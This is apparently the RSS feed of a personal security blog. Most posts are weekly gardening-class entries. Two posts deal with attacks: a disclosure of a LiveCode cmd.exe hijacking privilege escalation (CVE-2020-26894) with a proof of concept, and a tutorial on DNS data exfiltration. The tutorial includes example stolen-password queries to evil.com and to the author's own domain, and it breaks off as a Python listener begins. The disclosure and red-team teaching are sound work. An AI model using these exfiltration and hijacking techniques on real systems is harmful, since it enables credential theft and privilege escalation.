<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>John Woodman's Security Blog</title>
    <description>I'm a security enthusiast looking for new ways to break stuff and stay hidden while doing it. All content posted here is for educational and research purposes only. </description>
    <link></link>
    <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
    <author>
      <name>John Woodman</name>
      <email>john.woodman11@gmail.com</email>
      <uri>https://google.com/</uri>
    </author>
    
      <item>
        <title>Week 8&amp;#58; Hydro</title>
        <description>&lt;h2 id=&quot;upgrades&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;Upgrades&lt;/h2&gt;
&lt;p&gt;This week I built a hydroponic system for my lettuce seedling. I used an empty 2 Liter bottle of sprite, cutting the upper third off with scissors and poking a hole in the bottle cap. I then put cotton wick through the hole in the bottle cap and tied a knot so it wouldn’t fall out. I then added half a liter of water, 3 drops of vinegar, and 1/4 teaspoon of dissolvable fertilizer to the bottom of the bottle. Inside the upper third of the bottle, I added a substrate coco coir and then placed that upper third of the bottle inside the rest of the bottle, allowing the cotton wick to dip into the mixture of water, vinegar, and fertilizer. I then transplanted my lettuce seedling into the substrate and placed it at my window sill. Setting up the system seemed like it would be complicated at first, but was actually quite simple and straight forward. It’s a good thing that I germinated 2 lettuce seedlings, because one of them hasn’t sprouted (probably gonna have to put a new seed in). Below are pictures of my hydroponic system.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-10-25-Week-8/1.jpg&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-10-25-Week-8/2.jpg&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;other-updates&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Other Updates&lt;/h2&gt;
&lt;p&gt;In other news, my garden is doing really well! The transplanting of the bell pepper and basil seedlings seems to be doing great (knock on wood) and they’re growing quickly. All the other plants are growing fast as well, I can only assume due to the fertilizer I’ve added to each of them. Next week I’ll be working with microgreens, so look forward to that :).&lt;/p&gt;
</description>
        <pubDate>Sun, 25 Oct 2020 00:00:00 +0000</pubDate>
        <link>//posts/Week-8/</link>
        <link href="/posts/Week-8/"/>
        <guid isPermaLink="true">/posts/Week-8/</guid>
      </item>
    
      <item>
        <title>CVE-2020-26894 Privilege Escalation Vulnerability in LiveCode v9.6.1 Programming Language</title>
        <description>&lt;h1 id=&quot;summary&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;Summary&lt;/h1&gt;
&lt;p&gt;LiveCode v9.6.1 for Windows is vulnerable to a horizontal privilege escalation vulnerability.&lt;/p&gt;

&lt;p&gt;CVE Mitre Assigned: &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26894&quot;&gt;CVE-2020-26894&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;discovery&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Discovery&lt;/h1&gt;
&lt;p&gt;While taking a Wildlife Issues course at my University, I discovered a high severity vulnerability in the course software our class was using that leads to a horizontal privilege escalation.&lt;/p&gt;

&lt;p&gt;At first, I thought the vulnerability was only in this course software, but looking into it deeper and with the help of one of the developers at faulkner press, we discovered that the vulnerability actually lied in the programming language/framework they were using: LiveCode.&lt;/p&gt;

&lt;p&gt;For those who aren’t familiar, &lt;a href=&quot;https://livecode.com/&quot;&gt;LiveCode&lt;/a&gt; is a high-level scripting language belonging to the family of xTalk scripting languages along side HypderCard’s &lt;a href=&quot;https://en.wikipedia.org/wiki/HyperTalk&quot;&gt;HyperTalk&lt;/a&gt;, allowing you to build cross-platform applications with relative ease.&lt;/p&gt;

&lt;h1 id=&quot;vulnerability&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Vulnerability&lt;/h1&gt;
&lt;p&gt;LiveCode has a function called “shell()” which, as you would expect, allows you to run shell commands and store its output. Most high-level programming languages that have a similar shell command function will use the environment variable %COMSPEC in Windows to determine the location of the shell to use to run the command, unless otherwise specified by the programmer. For Linux, it will usually use “/bin/sh”.&lt;/p&gt;

&lt;p&gt;LiveCode v9.6.1, however, does not reference %COMSPEC when attempting to locate cmd.exe to run the “shell()” function. This is dangerous, since it means it will follow the &lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions//cc723564(v=technet.10)#command-search-sequence&quot;&gt;command search sequence&lt;/a&gt;. This will force the application to check the current directory of the application for cmd.exe before checking %PATH.&lt;/p&gt;

&lt;p&gt;This means that if the folder the application is running in is world writable (such as being installed in the root drive), then a low privileged user can create a malicious cmd.exe in that folder, which will be executed every time the application is started by any user on the system, and will assume the privileges of that user. This is known as horizontal privilege escalation.&lt;/p&gt;

&lt;p&gt;After contacting LiveCode, the vulnerability has been patched in LiveCode 9.6.2-rc-1&lt;/p&gt;

&lt;p&gt;Commit: &lt;a href=&quot;https://github.com/livecode/livecode/commit/9bd23b2008a51c9913513c1af014a76a9ff67dbe&quot;&gt;9bd23b2&lt;/a&gt; &amp;amp; &lt;a href=&quot;https://github.com/livecode/livecode-ide/commit/f309d60d2323c08b7d04425be3fef0c805808c5c&quot;&gt;f309d60&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;LiveCode Bug Report: &lt;a href=&quot;https://quality.livecode.com/show_bug.cgi?id=22942&quot;&gt;https://quality.livecode.com/show_bug.cgi?id=22942&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;CVE Mitre Assigned: &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26894&quot;&gt;CVE-2020-26894&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;workaround&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Workaround&lt;/h1&gt;
&lt;p&gt;For those who need a workaround and can’t update, use the following command to tell the “shell()” function to use C:\Windows\System32\cmd.exe&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;set the shellCommand to &quot;C:\Windows\System32\cmd.exe&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;proof-of-concept&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Proof-of-Concept&lt;/h1&gt;

&lt;p&gt;The following is code that is vulnerable to cmd.exe hijacking:
&lt;img src=&quot;/assets/2020-10-21-LiveCode-Privilege-Escalation-Vulnerability/1.png&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see below, procmon shows that the vulnerable application is attempting to first get “cmd.exe” from the folder the application is running in before using C:\Windows\System32\cmd.exe.
&lt;img src=&quot;/assets/2020-10-21-LiveCode-Privilege-Escalation-Vulnerability/2.png&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And below is a PoC exploitation of the vulnerable application to pop calc by simply copying calc.exe into the folder of the application and naming it cmd.exe.
&lt;img src=&quot;/assets/2020-10-21-LiveCode-Privilege-Escalation-Vulnerability/3.png&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block; margin-right: auto;&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Wed, 21 Oct 2020 00:00:00 +0000</pubDate>
        <link>//posts/LiveCode-Privilege-Escalation-Vulnerability/</link>
        <link href="/posts/LiveCode-Privilege-Escalation-Vulnerability/"/>
        <guid isPermaLink="true">/posts/LiveCode-Privilege-Escalation-Vulnerability/</guid>
      </item>
    
      <item>
        <title>Week 7&amp;#58; Plant Food</title>
        <description>&lt;h2 id=&quot;transplanting&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;Transplanting!&lt;/h2&gt;
&lt;p&gt;This week I transplanted my bell pepper and basil seedlings. The bell pepper seedling’s roots were starting to stick out of the peat pellet, so I knew it was time to move to the main garden. The basil seedlings probably could’ve stayed inside for a few more days, but I think they’ll be fine (knock on wood). I placed them in one of the corners of the garden, about 12 inches away from each other, making sure to water them thoroughly once transplanted. Below is a picture of my transplanted seedlings.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-10-17-Week-7/1.png&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;eat-eat-eat&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Eat, Eat, Eat&lt;/h2&gt;
&lt;p&gt;This week I also fertilized my plants, spreading about 1/4 teaspoon of fertilizer around each of my plants. I added more fertilizer than I was expecting, but that was the recommended amount, so we’ll see what happens. Based on things I’ve seen online (and other media in general), I thought only added a very very small amount of fertilizer would do the trick, and that adding too much could cause serious damage to your plants. Either way, I hope I put just the right amount. Below is a picture of my fertilized plants.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-10-17-Week-7/2.png&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;other-plant-news&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Other Plant News&lt;/h2&gt;
&lt;p&gt;In other news, my pole beans seem to be dominating the garden, growing faster than any other plant. So much so, in fact, that its neighboring sunflowers seem to be suffering from lack of sunlight due to the large amount of shade the pole beans cast. I’ve been moving the sunflowers to the sunlight more and more often, so we’ll have to wait and see.&lt;/p&gt;
</description>
        <pubDate>Sat, 17 Oct 2020 00:00:00 +0000</pubDate>
        <link>//posts/Week-7/</link>
        <link href="/posts/Week-7/"/>
        <guid isPermaLink="true">/posts/Week-7/</guid>
      </item>
    
      <item>
        <title>Week 6&amp;#58; Pinch</title>
        <description>&lt;h2 id=&quot;casualty&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;Casualty&lt;/h2&gt;
&lt;p&gt;One of my bell pepper seedlings has unfortunately suffered a casualty. While on the window sill, the blinds fell directly onto my germination station, cutting one of the bell pepper seedlings in half. All that remains is the stem. I’ve left it there and have continued to water it in hopes that it may still survive. RIP for now, bell pepper seedling. Forever in our hearts.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-10-11-Week-6/1.png&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;almost-ready-to-transplant&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Almost Ready To Transplant&lt;/h2&gt;
&lt;p&gt;Other than the one casualty, my other basil and bell pepper seedlings are looking really good! I don’t think they are quite ready to be transplanted yet, as they don’t have clear Cotyledons just yet, but I imagine in the coming week, it’ll be time to move them to the main garden.&lt;/p&gt;

&lt;h2 id=&quot;garden-growth&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Garden Growth&lt;/h2&gt;
&lt;p&gt;The garden itself looks to be doing pretty well! The plants are growing slower than I expected, but I think that tends to happen when they start developing more. Another of my onions have sprouted! The pole beans are now by far the largest plant in the garden. The sunflowers aren’t looking too great, they’ve become very twisty and fallen over quite a bit. Zinnia have started growing smaller leaves and the radishes are doing great! Below is a picture of the garden so far.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-10-11-Week-6/2.png&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

</description>
        <pubDate>Sun, 11 Oct 2020 00:00:00 +0000</pubDate>
        <link>//posts/Week-6/</link>
        <link href="/posts/Week-6/"/>
        <guid isPermaLink="true">/posts/Week-6/</guid>
      </item>
    
      <item>
        <title>Week 5&amp;#58; Irrigation</title>
        <description>&lt;h2 id=&quot;everything-is-growing&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;Everything is Growing!&lt;/h2&gt;
&lt;p&gt;One of my onions finally sprouted and is visible through the soil! It’s now official: every type of plant I’ve sowed has sprouted! The radishes and pole beans sprouted very quickly, much quicker than any of the others had. My garden is starting to look more and more like a garden everyday :). The sunflowers are still the tallest, but they’ve started drooping a little, so I’ll have to keep a watch on them. Below is a picture of my garden and me watering them. I poked holes in the top of a plastic milk gallon to use as watering can.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-10-01-Week-5/1.jpg&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;
&lt;img src=&quot;/assets/2020-10-01-Week-5/2.jpg&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;lettuce-wait&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Lettuce Wait&lt;/h2&gt;
&lt;p&gt;I started germinating lettuce seeds this week. I placed 2 in 2 separate peat pellets and placed them inbetween the basil and bell peppers. From what I’ve read, lettuce grows farily easily, so fingers crossed that it’s the same for me. I had to kill some of the basil and bell pepper seedlings, because they can’t all survive together in the peat pellet. Below is a picture of my egg carton with the germinating plants. 
&lt;img src=&quot;/assets/2020-10-01-Week-5/3.jpg&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When I told my roommates about this gardening class, and now that they’ve seen the progress I’ve made so far, they want to take the class next semester! I’m hoping to continue growing plants even after this class has ended, so it will be fun to have people to grow plants with.&lt;/p&gt;
</description>
        <pubDate>Thu, 01 Oct 2020 00:00:00 +0000</pubDate>
        <link>//posts/Week-5/</link>
        <link href="/posts/Week-5/"/>
        <guid isPermaLink="true">/posts/Week-5/</guid>
      </item>
    
      <item>
        <title>Week 4&amp;#58; Outdoor</title>
        <description>&lt;h2 id=&quot;theyre-growing&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;They’re Growing!&lt;/h2&gt;
&lt;p&gt;Quite a lot happened this past week. After watering the seeds I planted daily, some of them broke ground! The sunflowers were the first to come up, growing way faster than any of the others. The basil was the next to come, still inside the peat pellets. Then, just a couple days ago, the zinnia broke through! The onion starters still haven’t broken through yet, but I’m guessing those take longer to grow than the others, given the size. The bell peppers seeds still haven’t come up in the peat pellets, which I’m a little worried about. I’m going to continue to water them and see what happens. Below you can see pictures of all the plants that have started growing.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-09-24-Week-4/1.jpg&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;
&lt;img src=&quot;/assets/2020-09-24-Week-4/2.jpg&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;
&lt;img src=&quot;/assets/2020-09-24-Week-4/3.jpg&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;
&lt;img src=&quot;/assets/2020-09-24-Week-4/4.jpg&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;newcomers&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Newcomers&lt;/h2&gt;
&lt;p&gt;This week, I also planted some new seeds. I planted radish (6 seeds), and pole beans (4 seeds). I placed the radish along the side of the garden, close to the wall, and the pole beans next to the sunflowers. Below is a picture of my garden layout.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-09-24-Week-4/5.jpg&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Overall, I think planting wasn’t as difficult as I thought it was going to be. I expected to have almost nothing growing and having it be due to some issue like not having enough potting mix, or not enough sunlight or water. But it’s turning out pretty well so far, so fingers crossed that it continues! :)&lt;/p&gt;
</description>
        <pubDate>Thu, 24 Sep 2020 00:00:00 +0000</pubDate>
        <link>//posts/Week-4/</link>
        <link href="/posts/Week-4/"/>
        <guid isPermaLink="true">/posts/Week-4/</guid>
      </item>
    
      <item>
        <title>Week 3&amp;#58; Germination</title>
        <description>&lt;h2 id=&quot;germination&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;Germination&lt;/h2&gt;
&lt;p&gt;This week I finally started germinating my seeds. This is something I’ve never done before, so the whole process was very new to me. I started planting the following seeds:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Bell Peppers&lt;/li&gt;
  &lt;li&gt;Zinnia&lt;/li&gt;
  &lt;li&gt;Sun Flowers&lt;/li&gt;
  &lt;li&gt;Basil&lt;/li&gt;
  &lt;li&gt;Onion starters&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I germinated the bell peppers and basil seeds in peat pellets, which I placed indoors inside of an egg carton. This will allow it to grow enough to be transplanted to the main garden. The sun flower and zinnia seeds, as well as the onion starters were planted directly into the garden. I placed the sun flowers seeds a few inches apart and about 1/2 inch deep, the zinnia seeds a few inches apart and about 1/4 inch deep, and the oinon starter close together and about an inch deep into the soil.&lt;/p&gt;

&lt;p&gt;I’m watering the peat pellets regularly, as they need to be well watered in order to grow enough to be transplanted. It should take about 7 days for it to be grown enough for transplanting. I’m watering the garden on a regular basis as well, but not as often as the peat pellets. Below is a picture of the peat pellets in the egg carton, as well as a picture of the garden (I added plant labels so I don’t forget what I planted where, and my awesome roommate contributed a nice little scarecrow):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-09-16-Week-3/1.png&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-09-16-Week-3/2.png&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Wed, 16 Sep 2020 00:00:00 +0000</pubDate>
        <link>//posts/Week-3/</link>
        <link href="/posts/Week-3/"/>
        <guid isPermaLink="true">/posts/Week-3/</guid>
      </item>
    
      <item>
        <title>Week 2&amp;#58; Green Thumb</title>
        <description>&lt;h2 id=&quot;my-background&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;My Background&lt;/h2&gt;
&lt;p&gt;This is my first time gardening, and actually my first time dealing with any sort of plant care, so I’m very new to this, but also very excited to learn. I’ve always sort of imagined my older self having a small garden in my backyard where I would grow food that I would use for my meals, being as environmentally friendly as I could. I’m hoping this class will be a good introduction for me, and help me better understand the works that will go in to maintaining a garden.&lt;/p&gt;

&lt;h2 id=&quot;what-i-hope-to-learn&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;What I Hope To Learn&lt;/h2&gt;
&lt;p&gt;Like I said earlier, my goal for this class is to get a solid understanding of how to maintaing a basic garden. I’m hoping I can learn how to grow all the various types of food, from herbs to vegetables and fruits, or at the very least, be given the foundational knowledge I need to continue learning about gardening. I also hope to learn more about how my gardening can be an environmental benefit, such as re-using food I would usually throw away for my garden.&lt;/p&gt;

&lt;h2 id=&quot;beginning-stages&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Beginning Stages&lt;/h2&gt;
&lt;p&gt;Below is a picture of my garden setup so far. I cut together some pieces of wood for the walls, and used a wooden plank for the floor. I plan on grabbing some garbage bags to put between the soil and the wood, to prevent too much leaking and potentially warped wood.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-09-11-Week-2/1.png&quot; alt=&quot;&quot; height=&quot;50%&quot; width=&quot;50%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once I get the fertilizer and seeds, I can start growing!&lt;/p&gt;

</description>
        <pubDate>Fri, 11 Sep 2020 00:00:00 +0000</pubDate>
        <link>//posts/Week-2/</link>
        <link href="/posts/Week-2/"/>
        <guid isPermaLink="true">/posts/Week-2/</guid>
      </item>
    
      <item>
        <title>Week 1&amp;#58; Salad Inventory</title>
        <description>&lt;h2 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Welcome to my first gardening blog post. I plan on documenting my progress as I begin learning and growing my own 2.5ft x 2.5ft garden. This week to help me learn more about the different parts of a plant, I will be documenting an inventory of the last salad I ate, picking out which parts of the salad were leaves, flowers, roots, stems, or fruits.&lt;/p&gt;

&lt;h2 id=&quot;salad-inventory&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Salad Inventory&lt;/h2&gt;
&lt;p&gt;Below is a list of everything that was in my last salad, classified by their botanical definition:&lt;/p&gt;

&lt;h3 id=&quot;fruits&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fruits&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Tomatoes&lt;/li&gt;
  &lt;li&gt;Cucumber&lt;/li&gt;
  &lt;li&gt;Avocado&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;leaves&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Leaves&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Lettuce&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;flowers&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Flowers&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Broccoli&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I’m still in the process of building the 2.5ft x 2.5ft garden, but once it’s done I’ll have another post coming next week so stay tuned :)&lt;/p&gt;
</description>
        <pubDate>Tue, 01 Sep 2020 00:00:00 +0000</pubDate>
        <link>//posts/Week-1/</link>
        <link href="/posts/Week-1/"/>
        <guid isPermaLink="true">/posts/Week-1/</guid>
      </item>
    
      <item>
        <title>Setting Up Your Own Malicious DNS Server For Data Exfiltration (Without a DNS Server)</title>
        <description>&lt;p&gt;Data exfiltration is a key component of any red team/penetration testing assesment. Sometimes it’s as simple as scp’ing the sensitive data over an SSH connection. Other times, however, more sophisticated methods need to be used. One such common method is exfiltrating data through specially crafted URL requests to your public web server, such as placing the sensitive data as a GET parameter (www.evil.com?stolendata=password123). But what if firewall permissions are blocking any outbound HTTP traffic on the victim server? Or has a whitelist of allowed sites and yours isn’t on it (obviously)? Another method is still possible: DNS.&lt;/p&gt;

&lt;p&gt;In this post, I’ll be showing how I set up a public malicious (depending on how you use it) DNS server for exfiltrating data without actually having to run a DNS server ;).&lt;/p&gt;

&lt;h2 id=&quot;what-is-dns-exfiltration&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;What Is DNS Exfiltration?&lt;/h2&gt;

&lt;p&gt;The general idea of DNS exfiltration isn’t unsimilar to exfiltrating data through HTTP web requests. Sensitive data is attached to a DNS query that can then be viewed by our malicious DNS server. In this case, the sensitive data is prepended onto the subdomain of our controlled public domain. For example, if we were able to access the password of a user on a victim’s machine, in order to exfil that data, we would have the victim machine make a DNS request for password123.myevildomain.com, with the “password123” being the victim’s password. Since own myevildomain.com, the request to resolve password123 would come to my server. The best part is, I don’t even have to actually respond to the request since I’ve already got what I came for.&lt;/p&gt;

&lt;h2 id=&quot;what-youll-need&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;What You’ll Need&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Public Server you control (I used a digital ocean server)&lt;/li&gt;
  &lt;li&gt;Public domain name linked to that server&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;setting-up-the-pulbic-domain&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Setting Up The Pulbic Domain&lt;/h2&gt;

&lt;p&gt;The first thing you need is a publicly registered domain. You can do this on a number of sites, but I used godaddy to register john-woodman.com and pointed it to my digitalocean server.&lt;/p&gt;

&lt;h3 id=&quot;creating-a-hostname-for-our-nameserver&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Creating A Hostname For Our Nameserver&lt;/h3&gt;
&lt;p&gt;Once I registered the domain, I then added my own hostname as a nameserver through godaddy. The reason I had to do this is because nameserver records can’t specify an IP address, it must be a hostname. I made the hostname for the nameserver ns.john-woodman.com and pointed it to my digitalocean server IP.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/1.png&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;setting-nameservers-to-digitaloceans&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Setting Nameservers To DigitalOcean’s&lt;/h3&gt;
&lt;p&gt;DigitalOcean actually has the ability to manage DNS records for you. While I could do everything on godaddy or whichever name resolution service you chose, I found DigitalOcean has a nice, simple interface. In godaddy, I set the custom nameservers to DigitalOcean’s so that any DNS requests made to john-woodman.com would go to DigitalOcean.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/2.png&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now that we have that setup, we can do everything else on DigitalOcean.&lt;/p&gt;

&lt;h3 id=&quot;redirecting-subdomain-requests&quot;&gt;&lt;a href=&quot;#header-6&quot;&gt;&lt;/a&gt;Redirecting Subdomain Requests&lt;/h3&gt;
&lt;p&gt;I now have to create a few DNS records so that any requests to a specific subdomain will be redirected to my DNS Server instead of being handled by DigitalOcean’s. I first have to create an A record that points all requests to john-woodman.com to my IP (this is mostly to keep my website up and running). I then have to create an A record that points the nameserver domain (ns.john-woodman.com) to my server’s IP. Now, unfortunately, with NS records, I’m not able to specify a wildcard in the subdomain (such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt;.john-woodman.com). From what I can gather, it seems to just not be supported by DNS, with no reason why. Either way, we can get around this by actually just specifying any name for the subdomain, and all subdomain requests sent to that subdomain (subception) will be directed to our DNS server. In my case, I chose a completely random subdomain steve.john-woodman.com. You can call it whatever you want (probably best not to have special characters just to be safe). So when im exfiltrating data, the DNS request would look like for example: password123.steve.john-woodman.com. This is what my DNS configuration looks like on DigitalOcean.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/3.png&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;setting-up-the-listener&quot;&gt;&lt;a href=&quot;#header-7&quot;&gt;&lt;/a&gt;Setting Up The Listener&lt;/h2&gt;
&lt;p&gt;The nice part is we don’t actually have to run any DNS service on our server. We can just set up a simple python listener, sift through the data we recieve and grab what we need. Below is the code I wrote to listen on UDP port 53 (DNS requests come in on UDP for the most part).&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;dnslib&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DNSRecord&lt;/span&gt;

